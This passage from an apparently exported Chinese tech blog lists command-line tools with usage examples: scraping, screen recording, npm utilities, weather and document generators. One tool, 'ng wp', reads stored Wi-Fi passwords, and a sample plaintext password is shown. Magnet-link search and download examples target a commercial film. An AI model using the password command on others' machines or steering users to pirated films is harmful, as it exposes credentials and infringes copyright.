Zend Technologies[root@VM_0_14_centos ~]# exitasciinema: recording finishedasciinema: press &lt;enter&gt; to upload to asciinema.org, &lt;ctrl-c&gt; to save locallyView the recording at: https://asciinema.org/a/IwvE2eERFLGCN1PeT0eIibwBGThis installation of asciinema recorder hasn't been linked to any asciinema.orgaccount. All unclaimed recordings (from unknown installations like this one)are automatically archived 7 days after upload.If you want to preserve all recordings made on this machine, connect thisinstallation with asciinema.org account by opening the following link: https://asciinema.org/connect/01fb0f0e-c56a-450f-80ac-4020188dd957 Pyppeteer1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556pip3 install pyppeteerhttp://quotes.toscrape.com/js/，这个页面是 JavaScript 渲染而成的，用基本的 requests 库请求得到的 HTML 结果里面是不包含页面中所见的条目内容的。# 1 打开一个网页并做截图# 首次运行示例时，pyppeteer会自动下载对应操作系统的chromiumimport asynciofrom pyppeteer import launchasync def main(): browser = await launch() page = await browser.newPage() await page.goto('http://example.com') await page.screenshot(&#123;'path': 'example.png'&#125;) await browser.close()asyncio.get_event_loop().run_until_complete(main())# 2 在网页上执行一段脚本import asynciofrom pyppeteer import launchasync def main(): browser = await launch() page = await browser.newPage() await page.goto('http://example.com') await page.screenshot(&#123;'path': 'example.png'&#125;) dimensions = await page.evaluate('''() =&gt; &#123; return &#123; width: document.documentElement.clientWidth, height: document.documentElement.clientHeight, deviceScaleFactor: window.devicePixelRatio, &#125; &#125;''') print(dimensions) # &gt;&gt;&gt; &#123;'width': 800, 'height': 600, 'deviceScaleFactor': 1&#125; await browser.close()asyncio.get_event_loop().run_until_complete(main()) https://www.jianshu.com/p/611ed6b75d47 打开网站并截图 import asyncio from pyppeteer import launch async def main(): browser = await launch() page = await browser.newPage() await page.goto('https://zhangslob.github.io/') await page.screenshot(&#123;'path': 'zhangslob.png'&#125;) await browser.close() asyncio.get_event_loop().run_until_complete(main())第一次运行时需要下载Chromium，你可以提前在终端输入pyppeteer-install来下载λ pyppeteer-install[W:pyppeteer.chromium_downloader] start chromium download.Download may take a few minutes. 命令行录屏工具123456789101112131415161718192021222324pip install TermRecord它不会自动上传到网上，而是生成一个html文件，想要分享的话，你可以将其发送给好友。录制同样简单：TermRecord -o ggg.html同样使用exit或者Ctrl+D快捷键结束录制。要想查看录制结果，直接浏览器打开ggg.html就可以了。pip3 install asciinema asciinema rec还是使用exit或者Ctrl+D快捷键结束录制。与showterm不同的是，它会在结束录制的时候提示，如果要上传的话，敲回车，这样就不至于把废品也上传了。上传之后，asciinema会给出一个网址，如：https://asciinema.org/a/44nu2i2ieywlmqq9wx5sk5k1e。要想嵌入到自己的网页上也没有问题：&lt;script type="text/javascript" src="https://asciinema.org/a/44nu2i2ieywlmqq9wx5sk5k1e.js" id="asciicast-44nu2i2ieywlmqq9wx5sk5k1e" async&gt;&lt;/script&gt;如果不想上传，可以用这条命令将其保存为一个json文件：asciinema rec ggg.json使用以下命令可以查看录制结果：asciinema play ggg.json甚至可以再次上传：asciinema upload ggg.json还能通过asciinema auth命令并在asciinema上注册账号来管理自己上传的文件，功能上确实是这几个工具中最强大的http://qinghua.github.io/terminal-recorder/ 音频拼接1234567891011121314 pip install soxCollecting sox Downloading https://files.pythonhosted.org/packages/60/a0/5bee540554af8376e0313e462629d95bf2f2bc3c8cb60697aa01254e6cf5/sox-1.3.7-py2.py3-none-any.whlInstalling collected packages: soxSuccessfully installed sox-1.3.7You are using pip version 19.0.3, however version 19.1.1 is available.You should consider upgrading via the 'python -m pip install --upgrade pip' command.import sox cbn = sox.Combiner() data = [filename1,filename2] cbn.build(data, new_file, 'concatenate')终端执行：https://learnku.com/articles/30609 sox --combine concatenate 1.wav 2.wav out.wav 命令行获取磁力工具1234567891011121314151617181920212223242526272829$ git clone https://github.com/cexll/cilimao-cli.git $ cd cilimao-cli $ pip install -r requires.txt $ python setup.py install磁力获取器命令行工具 pip install torrent-cli https://github.com/chenjiandongx/torrent-cliλ cilimao-cli -h命令行磁力猫查询默认选择按视频排序,按下载热度排序Usage: cilimao [-p] &lt;KEYWORD&gt; cilimao [-h,--help] 显示帮助菜单Options: -h,--help 显示帮助菜单 -p 页数(默认为0)Example: cilimao 复仇者联盟 cilimao -p 1 复仇者联盟d:\code\cilimao-cli (master)λ cilimao-cli 复仇者联盟Crawling data for you.....磁链标题: 复仇者联盟3磁链地址: magnet:?xt=urn:btih:5A1F3081715D0F38AABD13D4499EF4153A56184E文件数目: 1文件大小: 2.9139890475198627GB创建时间: 2018-05-17 18:33:25 获取ip和WiFi12345678910111213141516$ pip install nghttps://github.com/cls1991/ngGet your ip address:$ ng ip`local_ip:192.168.1.114public_ip:49.4.160.250`Get wifi password:$ ng wp$ ng wp flyfish_5g`flyfish_5g:hitflyfish123456` 5 秒抠图的 AI 神器12345678910111213在网站上注册获取 API pip install removebgfrom removebg import RemoveBgrmbg = RemoveBg("WPZ2Q4fraseKfAN9PPxxxxxx", "error.log") # 引号内是你获取的APIrmbg.remove_background_from_img_file("C:/Users/sony/Desktop/1.jpg") #图片地址from removebg import RemoveBgimport osrmbg = RemoveBg("WPZ2Q4fraseKfAN9PPxxxxxx", "error.log")path = '%s/picture'%os.getcwd() #图片放到程序的同级文件夹 picture 里面for pic in os.listdir(path): rmbg.remove_background_from_img_file("%s%s"%(path,pic)) https://github.com/brilam/remove-bg 摩尔斯密码123456789pip install morse-talkimport morse_talk as mtalkcontent = 'i love you'mo_content = mtalk.encode(content)print mo_contentimport morse_talk as mtalkmo_content = '-.-- --- ..-'content = mtalk.decode(mo_content)print content 电影字幕下载神器12345678910111213141516171819pip install subliminalsubliminal download -l zh [电影名称]from datetime import timedelta https://github.com/Diaoul/subliminalfrom babelfish import Languagefrom subliminal import download_best_subtitles, region, save_subtitles, scan_videos # configure the cacheregion.configure('dogpile.cache.dbm', arguments=&#123;'filename': 'cachefile.dbm'&#125;) # scan for videos newer than 2 weeks and their existing subtitles in a foldervideos = scan_videos('/video/folder', age=timedelta(weeks=2)) # download best subtitlessubtitles = download_best_subtitles(videos, &#123;Language('eng'), Language('fra')&#125;) # save them to disk, next to the videofor v in videos: save_subtitles(v, subtitles[v]) 命令行工具 Speedtest-CLI 来测试你的上下行网速 一个命令行 Python 工具 2018python榜单 10 分钟速成 Python3 Windows 下有哪些替代 CMD 的命令行工具 有哪些命令行的软件堪称神器 优秀的命令行工具整理 10款Windows命令行工具 一些能够改你效率的工具 shell]]></content>
      <tags>
        <tag>命令行</tag>
        <tag>工具</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[npm命令行工具收集]]></title>
    <url>%2F2018%2F11%2F28%2F%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86%2F</url>
    <content type="text"><![CDATA[安装node1234567891011121314151617181920yum install -y node npm安装node版本管理工具'n';$ sudo npm install n -g$ sudo n stable （安装node最新版本）$ sudo n 8.9.4 （安装node指定版本8.9.4）$ vim /etc/profile将node安装的路径（这里为：/usr/local/n/versions/node/8.9.4）添加到文件末尾；#set node pathexport NODE_HOME=/usr/local/n/versions/node/8.9.4export PATH=$NODE_HOME/bin:$PATHwq退出保存文件，编译/etc/profile;$ source /etc/profilenpm install -g cnpm --registry=https://registry.npm.taobao.org 显示npm命令行包123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157命令行工具安装目录which pinyin: /c/Users/xxx/AppData/Roaming/npm/pinyinnpm ls -g --depth=0 #对应的有web版 https://q-nick.github.io/npm-gui/ https://720kb.github.io/ndm/npm ls -g # 查看全局安装的模块#node 包网站地址 https://www.npmjs.com/package/fanyi$ npm ls -g --depth=0d:\nodejs+-- @vue/cli@3.0.0-alpha.5+-- admin-mongo@0.0.23+-- adr@1.0.7+-- airing-translator@1.0.4+-- anyproxy@4.0.6+-- anywhere@1.4.0+-- apidoc@0.17.6+-- asciify@1.3.5+-- babel@5.6.23+-- error: ENOENT: no such file or directory, open 'd:\nodejs\node_modules\babel-cli\package.json+-- baidu-ocr-api@2.0.5+-- bash-handbook@2.9.7+-- bower@1.2.8+-- browser-sync@2.18.8+-- brunch@1.7.14+-- btc@0.0.4+-- bugfreejs@1.2.0+-- caniuse-cmd@1.3.1+-- cash@0.8.0+-- cellocate@0.1.4+-- clean-scripts@1.2.1+-- cli-scraper@1.0.2+-- cloc@2.2.0+-- cnpm@4.2.0+-- codedog@0.0.4+-- coffee-script@1.7.1+-- component@1.1.0+-- cortex@5.4.6+-- cqc@0.1.3+-- crawl-pet@0.0.3+-- diffchecker@0.1.4+-- docsify-cli@4.2.1+-- domain-cli@0.1.10+-- doubanfm@0.1.4+-- doxmate@0.2.5+-- electron-pdf@1.2.0+-- everblog@1.1.0+-- express@3.4.8+-- fanyi@2.0.1+-- fe-interview@4.10.2+-- figlet@1.2.0+-- fis@1.7.14+-- fjpublish@2.0.0+-- forever@0.15.3+-- fund@1.0.0+-- fx@3.1.0+-- generator-generator@0.4.2 -&gt; e:\node\generator-kissy-gallery+-- gifify@2.4.0+-- girlcrawler@1.1.0+-- git-recall@1.2.4+-- gitbook@3.2.2+-- gitbook-cli@2.3.0+-- google-cli@0.1.0+-- grank@1.0.18+-- grunt-cli@0.1.13+-- gtop@0.1.6+-- gulp@3.8.10+-- helloshell@0.0.1+-- hexo@2.8.2+-- hexo-cli@1.1.0+-- html-pdf@2.1.0+-- http-proxy-to-socks@1.0.1+-- http-server@0.9.0+-- idoc@0.1.2+-- irest-cli@1.0.5+-- jscpd@0.6.17+-- jsdoc@3.3.0-alpha10+-- json-server@0.9.6+-- jsonplaceholder@0.2.4+-- juejin@1.0.14+-- error: ENOENT: no such file or directory, open 'd:\nodejs\node_modules\karma\package.json+-- koy@0.0.7+-- laravel-echo-server@1.3.8+-- learnyounode@0.4.1+-- leetcode-cli@0.9.0+-- lighthouse@2.3.0+-- lint-md@0.0.4+-- livepool@0.7.9+-- livereloadx@0.3.6+-- liyu@0.1.2+-- localtunnel@1.9.0+-- lyric-dl@0.1.4+-- m-console@0.1.0+-- mailit@0.0.3+-- manet@0.4.19+-- mapscii@0.1.7+-- markdown-it@8.3.1+-- markdown-pdf@7.0.0+-- measure-export-cli@0.5.2+-- mpspider@1.0.1+-- nativefier@7.5.4+-- node-cube@0.1.0+-- node-inspector@0.7.3+-- node-reveal@1.2.2+-- nodemon@1.0.17+-- nodeppt@0.8.9-1+-- npm@3.10.10+-- oji@1.0.7+-- page2image@1.7.1+-- parcel-bundler@1.3.0+-- pdf-bot@0.3.3+-- pinyin@2.3.3+-- pm2@3.0.0+-- ppt-cli@1.2.9+-- puer@1.1.4+-- purify-css@1.2.5+-- qrcode-terminal@0.12.0+-- rdoc@1.3.4+-- requirejs@2.1.15+-- rocket-cli@0.0.5+-- runtime-cli@3.2.0+-- serve@6.3.1+-- server-mock@1.0.5+-- sharemd-cli@0.0.2+-- simpler-paper@0.1.5+-- socket-pipe@2.4.0+-- speed-test@2.0.0+-- spm@2.2.5+-- sqlpad@2.3.2+-- stacks-cli@0.1.44+-- suoxie@0.6.0+-- t-get@1.1.0+-- terminal-translate@1.0.4+-- tianshu@0.9.1+-- tldr@1.6.0+-- todo-live@0.1.3+-- translator-cli@0.3.0+-- truffle@4.1.13+-- u.nu@0.0.2+-- uncss@0.8.1+-- v2ex-cli@0.2.6+-- error: ENOENT: no such file or directory, open 'd:\nodejs\node_modules\vian\package.json+-- vue-cli@2.5.1+-- webpack@1.14.0+-- webtorrent-cli@1.10.1+-- weinre@2.0.0-pre-HZO3BMNG+-- whay@1.1.0+-- whistle@1.12.0+-- world-cup-cli-dashboard@1.6.0+-- wtfjs@1.3.0+-- wtfpython@1.2.4+-- xmocker-cli@1.0.2+-- xmysql@0.1.8+-- xxb@0.0.2+-- yddict@1.0.2+-- yo@1.1.2+-- your-name@1.0.1+-- yrm@1.0.6+-- commitizen@2.10.1`-- zan-proxy@4.0.17 文件比较123npm install -g diffcheckerdiffchecker file1.js file2.jsdiffchecker --expire day file1.js file2.js 录制 CLI123npm install -g svg-term-clisvg-term --cast=113643 --out examples/parrot.svg --window#https://github.com/marionebl/svg-term-cli gitbook-cli123456789101112131415161718192021222324252627282930313233343536373839404142434445//https://www.omybug.com/2016/07/06/GitBook%E4%BD%BF%E7%94%A8/cnpm install -g gitbook-cligitbook -V新建目录mybook，在目录中输入新建文件夹SUMMARY.md，先建立一个目录，输入一下内容* [简介](README.md)* [第一章](chapter1/README.md) - [第一节](chapter1/section1.md) - [第二节](chapter1/section2.md)* [第二章](chapter2/README.md) - [第一节](chapter2/section1.md) - [第二节](chapter2/section2.md)* [结束](end/README.md)执行命令自动生成各章节文件gitbook init导出成htmlgitbook build本地测试gitbook serve启动就可以通过以下地址访问效果了http://localhost:4000/当你编辑过文件之后，不需要重新启动serve，在线刷新一下就可以看到效果gitbook help //列出gitbook所有的命令gitbook –help //输出gitbook-cli的帮助信息gitbook build –gitbook=2.0.1 //生成时指定gitbook的版本, 本地没有会先下载gitbook ls //列出本地所有的gitbook版本gitbook ls-remote //列出远程可用的gitbook版本gitbook fetch 标签/版本号 //安装对应的gitbook版本gitbook update //更新到gitbook的最新版本gitbook uninstall 2.0.1 //卸载对应的gitbook版本gitbook build –log=debug //指定log的级别gitbook builid –debug //输出错误信息touch README.md SUMMARY.mdgit initgit add README.md SUMMARY.mdgit commit -m “first commit”git remote add gitbook https://git.gitbook.com/&#123;&#123;UserName&#125;&#125;/&#123;&#123;Book&#125;&#125;.gitgit push -u gitbook mastergit remote add gitbook https://git.gitbook.com/&#123;&#123;UserName&#125;&#125;/&#123;&#123;Book&#125;&#125;.gitgit push -u gitbook master 查询天气12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364$curl wttr.in\?lang=zh天氣預報： Beijing, China \ / 晴天 .-. -1 °C ― ( ) ― ↙ 0 km/h `-’ 7 km / \ 0.0 mm ┌─────────────┐┌──────────────────────────────┬───────────────────────┤ 一 14 1月 ├───────────────────────┬──────────────────────────────┐│ 早上 │ 中午 └──────┬──────┘ 晚間 │ 晚 │├──────────────────────────────┼──────────────────────────────┼──────────────────────────────┼──────────────────────────────┤│ \ / 晴天 │ \ / 局部多云 │ \ / 局部多云 │ \ / 晴朗 ││ .-. 1 °C │ _ /"".-. 5 °C │ _ /"".-. 2-4 °C │ .-. -4-1 °C ││ ― ( ) ― ← 2-3 km/h │ \_( ). ↖ 3-4 km/h │ \_( ). → 10-16 km/h │ ― ( ) ― ↘ 25-39 km/h ││ `-’ 20 km │ /(___(__) 20 km │ /(___(__) 20 km │ `-’ 20 km ││ / \ 0.0 mm | 0% │ 0.0 mm | 0% │ 0.0 mm | 0% │ / \ 0.0 mm | 0% │└──────────────────────────────┴──────────────────────────────┴──────────────────────────────┴──────────────────────────────┘$ curl wttr.in/Beijing$ curl wttr.in/北京$ curl wttr.in/pek # 北京首都国际机场Weather report: pek \ / Sunny .-. -1 °C ― ( ) ― ↙ 0 km/h `-’ 7 km / \ 0.0 mm ┌─────────────┐┌──────────────────────────────┬───────────────────────┤ Mon 14 Jan ├───────────────────────┬──────────────────────────────┐│ Morning │ Noon └──────┬──────┘ Evening │ Night │├──────────────────────────────┼──────────────────────────────┼──────────────────────────────┼──────────────────────────────┤│ \ / Sunny │ \ / Partly cloudy │ \ / Partly cloudy │ \ / Clear ││ .-. 0 °C │ _ /"".-. 3-4 °C │ _ /"".-. 0-2 °C │ .-. -5-1 °C ││ ― ( ) ― ← 3-4 km/h │ \_( ). ↑ 4 km/h │ \_( ). ↗ 8-16 km/h │ ― ( ) ― ↘ 19-35 km/h ││ `-’ 20 km │ /(___(__) 20 km │ /(___(__) 20 km │ `-’ 20 km ││ / \ 0.0 mm | 0% │ 0.0 mm | 0% │ 0.0 mm | 0% │ / \ 0.0 mm | 0% │└──────────────────────────────┴──────────────────────────────┴──────────────────────────────┴──────────────────────────────┘ ┌─────────────┐┌──────────────────────────────┬───────────────────────┤ Tue 15 Jan ├───────────────────────┬──────────────────────────────┐│ Morning │ Noon └──────┬──────┘ Evening │ Night │├──────────────────────────────┼──────────────────────────────┼──────────────────────────────┼──────────────────────────────┤│ \ / Sunny │ \ / Sunny │ \ / Clear │ \ / Clear ││ .-. -12--6 °C │ .-. -10--4 °C │ .-. -4--1 °C │ .-. -3--1 °C ││ ― ( ) ― ↘ 17-23 km/h │ ― ( ) ― ↘ 19-22 km/h │ ― ( ) ― ↘ 8-10 km/h │ ― ( ) ― → 6-7 km/h ││ `-’ 20 km │ `-’ 20 km │ `-’ 20 km │ `-’ 20 km ││ / \ 0.0 mm | 0% │ / \ 0.0 mm | 0% │ / \ 0.0 mm | 0% │ / \ 0.0 mm | 0% │└──────────────────────────────┴──────────────────────────────┴──────────────────────────────┴──────────────────────────────┘ ┌─────────────┐┌──────────────────────────────┬───────────────────────┤ Wed 16 Jan ├───────────────────────┬──────────────────────────────┐│ Morning │ Noon └──────┬──────┘ Evening │ Night │├──────────────────────────────┼──────────────────────────────┼──────────────────────────────┼──────────────────────────────┤│ \ / Sunny │ \ / Sunny │ \ / Partly cloudy │ \ / Partly cloudy ││ .-. -5--3 °C │ .-. -1-1 °C │ _ /"".-. -2--1 °C │ _ /"".-. -3--2 °C ││ ― ( ) ― ↘ 4-5 km/h │ ― ( ) ― ↗ 5-6 km/h │ \_( ). ↑ 4-6 km/h │ \_( ). ↘ 2-4 km/h ││ `-’ 20 km │ `-’ 20 km │ /(___(__) 20 km │ /(___(__) 20 km ││ / \ 0.0 mm | 0% │ / \ 0.0 mm | 0% │ 0.0 mm | 0% │ 0.0 mm | 0% │└──────────────────────────────┴──────────────────────────────┴──────────────────────────────┴──────────────────────────────┘Location: 北京首都国际机场, 航管南路, 朝阳区 / Chaoyang, 北京市, 101312, 中国 [40.07928545,116.594560692]Follow @igor_chubin for wttr.in updates$ curl wttr.in/sha # 上海虹桥国际机场$ curl "wttr.in/Beijing?u"$ curl "wttr.in/Beijing?m" 生成各种不同环境下某个网页的截图1234567npm i -g screenshoteerscreenshoteer --url https://www.example.comor .html localy copy the url path from the browserscreenshoteer --url file:///Users/../index.htmlscreenshoteer --url file:///C:/Users/../Random-HTML-file.html 豆瓣电台命令行版12npm i doubanfm -gdoubanfm 不再为文档而发愁1234567891011121314$ npm install doxmate -g// 签出doxmate项目$ git clone git://github.com/JacksonTian/doxmate.git ~/git/doxmate// 去到项目目录$ cd doxmate$ doxmate build// 在docs目录下将会得到文档$ open ~/git/doxmate/doc/index.html// 或者 -o folder，可以将文档生成到指定的目录下$ doxmate build -o ~/output// 带上-s参数后，可以选择doxmate提供的几种模板$ doxmate build -s wordpress//卸载npm uninstall girlcrawler -g pdf转换1234567891011npm install electron-pdf -gTo generate a PDF from a HTML file$ electron-pdf index.html ~/Desktop/index.pdfTo generate a PDF from a Markdown file$ electron-pdf index.md ~/Desktop/index.pdf$ electron-pdf https://fraserxu.me ~/Desktop/fraserxu.pdf$ npm install -g html-pdf$ html-pdf test/businesscard.html businesscard.pdf mp4转gif1234npm install -g gififygifify back.mp4 -o back.gif --from 01:48:23.200 --to 01:48:25.300 --text "What?..What?What?"gifify 22.mkv -o movie.gif --subtitles 22.ass --from 1995 --to 2002 --resize 600:-1gifify screencast.mkv -o screencast.gif --resize 800:-1 系统面板12$ npm install gtop -g$ gtop gitbook1234$ npm install gitbook-cli -g$ gitbook init$ gitbook serve$ gitbook build 个人脚本管理工具12345$ npm install helloshell -g$ git clone https://github.com/wl879/HelloShell.git$ chmod 777 ./HelloShell/main.py$ ln -s "$(pwd)/HelloShell/main.py" /usr/local/bin/helloshell$ helloshell new name [-l [name]] 静态博客1234$ npm install hexo-cli -g$ hexo init blog$ cd blog$ hexo server rest api json1234567891011121314151617181920$ npm install -g json-serverCreate a db.json file&#123; "posts": [ &#123; "id": 1, "title": "json-server", "author": "typicode" &#125; ], "comments": [ &#123; "id": 1, "body": "some comment", "postId": 1 &#125; ], "profile": &#123; "name": "typicode" &#125;&#125;Start JSON Server$ json-server --watch db.jsonNow if you go to http://localhost:3000/posts/1, you'll get&#123; "id": 1, "title": "json-server", "author": "typicode" &#125; md预览1234567891011$ npm i koy -g$ koy # Or a specific file $ koy some-file.md # Or a README.md in Github repo $ koy gh:djyde/koy # Or a README.md in NPM $ koy npm:koy Web 开发调试工具12npm install livepool -glivepool 下载在线音乐歌词1234npm install lyric-dl -gnpm update lyric-dl -glyric-dl download &lt;url&gt; --out-format jsonlyric-dl search &lt;name&gt; 控制台登录pc浏览器12npm install -g m-consolemcon server 屏幕截图12345npm install -g slimerjsnpm install -g phantomjsnpm install -g phantomjs2npm install -g manetmanet 公众号文章抓取123456789101112131415161718npm i mpspider -g# 第一种方式 mpspider url https://mp.weixin.qq.com/s/CIPosICgva9haqstMDIHag -d dest_path# 第二种方式，需要手动配置代理，点击公众号「查看历史文章」，详见下面介绍 mpspider proxy -d dest_path -p proxy_port# 进入抓取后gitbook的地址 cd dest_path# 创建readme.md，gitbook不创建会报错 touch README.md# 有必要可以创建book.json，参考gitbook文档 gitbook serve# 访问地址查看效果 #npm i gitbook-cli -g# 生成电子书 gitbook mobi ./ name.mobi anyproxy --rule lib/anyproxyRule.js 网页打包12345npm install nativefier -g nativefier.cmd "http://github.com"Downloading tmp-19012-1-SHASUMS256.txt-3.0.3[============================================&gt;] 100.0% of 4.74 kB (4.74 kB/s)Packaging app for platform win32 x64 using electron v3.0.3 nodeppt12345678910111213141516171819202122232425262728293031323334353637383940npm install -g nodeppt# 获取帮助 nodeppt start -h# 绑定端口 nodeppt start -p &lt;port&gt;nodeppt start -p 8090 -d path/for/ppts# 绑定host，默认绑定0.0.0.0 nodeppt start -p 8080 -d path/for/ppts -H 127.0.0.1# 使用socket通信（按Q键显示/关闭二维码，手机扫描，即可控制） # socket须知：1、注意手机和pc要可以相互访问，2、防火墙，3、ip # 获取generate帮助 nodeppt generate -h# 使用generate命令 nodeppt generate filepath# 导出全部，包括nodeppt的js、img和css文件夹 # 默认导出在publish文件夹 nodeppt generate ./ppts/demo.md -a# 指定导出文件夹 nodeppt generate ./ppts/demo.md output/path -a# create a new slide with an official template$ nodeppt new slide.md# create a new slide straight from a github template$ nodeppt new slide.md -t username/repo# start local sever show slide$ nodeppt serve slide.md INFO Starting development server... 98% after emitting DONE Compiled successfully in 4588ms19:44:58 s NodePPT running at: - Url: http://10.235.51.39:8080/ - Speaker Mode: http://10.235.51.39:8080/?mode=speaker# to build a slide$ nodeppt build slide.md 网页转图片12345678910npm i page2image --global# Single page &gt; page2image https://github.com/Runjuu --type=jpeg --quality=80 # Multi-page &gt; page2image https://github.com/Runjuu https://github.com/Runjuu --type=jpeg --quality=80 # Local file &gt; page2image ./index.html --type=jpeg --quality=80page2image https://github.com/Runjuu --selector=".js-contribution-graph" 汉字拼音转换1234npm install pinyin -g$ pinyin 中心zhōng xīn$ pinyin -h md ppt123456ppt file.md ppt a.md --theme=black --transition=zoomppt https://raw.githubusercontent.com/jirengu/server-mock/master/README.mdListening on port 8080. open http://localhost:8080/README.html 实时编辑刷新的前端服务器123npm -g install puercd /path/to/workspace ↵puer 二维码1234$ npm install -g qrcode-terminal$ qrcode-terminal --help$ qrcode-terminal 'http://github.com'$ echo 'http://github.com' | qrcode-terminal 静态站点生成器12345npm install rdoc -grdoc init my-projectcd my-project &amp;&amp; npm install # Install dependencies. npm start # Into the directory, start the service. 网络测速123456npm install --global speed-testspeed-test.cmd Ping 13 ms Download 48 Mbps Upload 24 Mbps 运行SQL查询并可视化结果1234567 npm install -g sqlpad#http://rickbergfalk.github.io/sqlpad/sqlpad --dir ./sqlpaddata --ip 127.0.0.1 --port 3000 --passphrase secr3t optional driver ../drivers/unixodbc not available Welcome to SQLPad!. Visit http://127.0.0.1:3000 to get started docker-compose up -d 检查网站堆栈12$ npm install stacks-cli -g$ stacks-cli 种子12npm install -g t-gettget 'magnet:?xt=urn:btih:0403fb4728bd788fbcb67e87d6feb241ef38c75a' 命令行提示123456789101112131415161718npm install -g tldr#类似cheatλ tldr curl√ Page not found. Updating cache√ Creating index curl Transfers data from or to a server. Supports most protocols, including HTTP, FTP, and POP3. - Download the contents of an URL to a file: curl http://example.com -o filename - Download a file, saving the output under the filename indicated by the URL: curl -O http://example.com/filename - Download a file, following [L]ocation redirects, and automatically [C]ontinuing (resuming) a previous file transfer: curl -O -L -C - http://example.com/filename 以太坊的开发环境12$ npm install -g truffle$ truffle init 流媒体客户端12npm install webtorrent-cli -g$ webtorrent magnet_uri wtfjs1$ npm install -g wtfjs wtfpython12$ npm install -g wtfpython$ pip install wtfpython -U 前端模拟用工具123npm i -g xmocker-cliλ mocker start后台管理界面运行于: http://localhost:6001 耗时： 607 ms MySql数据库生成REST API1234567891011121314151617181920npm install -g xmysql xmysql.cmd -h localhost -u root -p root -d laravel Generating REST APIs at the speed of your thought.. - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - Database : laravel Number of Tables : 19 REST APIs Generated : 370 Xmysql took : 0.9 seconds API's base URL : localhost:3000 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -GET / 200 29908 - 8.113 msGET /api/admin_menu/describe 200 708 - 49.192 ms 检查基金收入1234567891011121314151617181920212223npm install xxb -gλ xxbinfo xxb is running. Press Ctrl+C to stopWARN Can't find ~/.xxb file, using default configuration┌──────────────┬─────────────────────────────┬────────────┬───────────────┬──────────┐│ 产品名称 │ 合作基金 │ 发售平台 │ 7日年化收益率 │ 万份收益 │├──────────────┼─────────────────────────────┼────────────┼───────────────┼──────────┤│ 零钱宝 │ 汇添富现金宝货币(000330) │ 苏宁 │ 3.3710% │ 0.8838元 │├──────────────┼─────────────────────────────┼────────────┼───────────────┼──────────┤│ 现金宝 │ 汇添富现金宝货币(000330) │ 网易理财 │ 3.3710% │ 0.8838元 │├──────────────┼─────────────────────────────┼────────────┼───────────────┼──────────┤│ 财富宝 │ 华夏财富宝货币A(000343) │ 微信理财通 │ 3.2740% │ 0.8739元 │├──────────────┼─────────────────────────────┼────────────┼───────────────┼──────────┤│ 全额宝 │ 汇添富全额宝货币(000397) │ 微信理财通 │ 3.0730% │ 0.8303元 │├──────────────┼─────────────────────────────┼────────────┼───────────────┼──────────┤│ 百赚利滚利版 │ 嘉实活期宝货币(000464) │ 百度理财 │ 3.1290% │ 0.8280元 │├──────────────┼─────────────────────────────┼────────────┼───────────────┼──────────┤│ 百赚 │ 华夏现金增利货币A/E(003003) │ 百度理财 │ 3.0950% │ 0.8093元 │├──────────────┼─────────────────────────────┼────────────┼───────────────┼──────────┤│ 零钱宝 │ 广发天天红货币A(000389) │ 苏宁 │ 2.8420% │ 0.7621元 │├──────────────┼─────────────────────────────┼────────────┼───────────────┼──────────┤│ 余额宝 │ 天弘余额宝货币(000198) │ 支付宝 │ 2.5260% │ 0.6881元 │└──────────────┴─────────────────────────────┴────────────┴───────────────┴──────────┘ 静态文件服务器1234567891011121314151617181920212223npm install anywhere -g$ anywhere// or with port$ anywhere -p 8000// or start it but silent(don't open browser)$ anywhere -s// or with hostname$ anywhere -h localhost -p 8888// or with folder$ anywhere -d ~/git/anywhere// or enable html5 history$ anywhere -f /index.htmlnpm install -g serve serve ┌──────────────────────────────────────────────────┐ │ │ │ Serving! │ │ │ │ - Local: http://localhost:5000 │ │ - On Your Network: http://10.235.51.43:5000 │ │ │ │ Copied local address to clipboard! 图片识别123456789npm install baidu-ocr-api -g ocr --help ＃ 远程图片 ocr http://7pun4e.com1.z0.glb.clouddn.com/test.jpg ＃ 本地图片 ocr ./test.jpg 翻译1234567891011121314$ npm install fanyi -g$ fanyi "make love"- make love ~ fanyi.youdao.com - v. 做爱；示爱（献殷勤） 1. make love 做爱,制造浪漫,作爱 2. Make Someone Love You 迫使别人喜欢自己 3. Make up love 配制爱情 镜像管理12345678910111213$ npm install -g nrm$ nrm ls npm ---- https://registry.npmjs.org/ cnpm --- http://r.cnpmjs.org/* taobao - https://registry.npm.taobao.org/ nj ----- https://registry.nodejitsu.com/ rednpm - http://registry.mirror.cqupt.edu.cn/ npmMirror https://skimdb.npmjs.com/registry/ edunpm - http://registry.enpmjs.org/$ nrm use cnpm //switch registry to cnpm Registry has been set to: http://r.cnpmjs.org/ 将纯文本转换为ascii12345678910npm install -g asciifyasciify "Boom" -f larry3d ____ /\ _`\ \ \ \L\ \ ___ ___ ___ ___ \ \ _ &lt;' / __`\ / __`\ /' __` __`\ \ \ \L\ \/\ \L\ \/\ \L\ \/\ \/\ \/\ \ \ \____/\ \____/\ \____/\ \_\ \_\ \_\ \/___/ \/___/ \/___/ \/_/\/_/\/_/ 进程管理123$ npm install pm2 -g$ pm2 start app.js$ pm2 list 版本管理器 n12345678910111213141516171819$ npm install -g n$ n stable (安装最新的稳定版)$ n latest (安装最新版本)$ n lts (安装长期支持版本，一般会 LTS 版)$ n (显示已安装版本并选择)#切换8.9.4版$ n bin 8.9.4/usr/local/n/versions/node/8.9.4/bin/node (获得路径)vi /etc/profile按 i 进入 Insert 模式，在末尾添加# nodejs PATHexport NODE_HOME=/usr/local/n/versions/node/8.9.4export PATH=$NODE_HOME/bin:$PATH按 ESC 退出 Insert 模式，输入 :wq 回车保存并退出$ source /etc/profile find替代方案1234https://linux.cn/article-10171-1.html https://github.com/chinanf-boy/fd-zh$ fd cli # 所有包含 "cli" 的文件名$ fd -e md # 所有以 .md 作为扩展名的文件$ fd cli -x wc -w # 搜索 "cli" 并且在每个搜索结果上运行 `wc -w` jq12345https://github.com/stedolan/jq$ npm i $(echo $(\ npm outdated --json | \ jq -r 'to_entries | .[] | 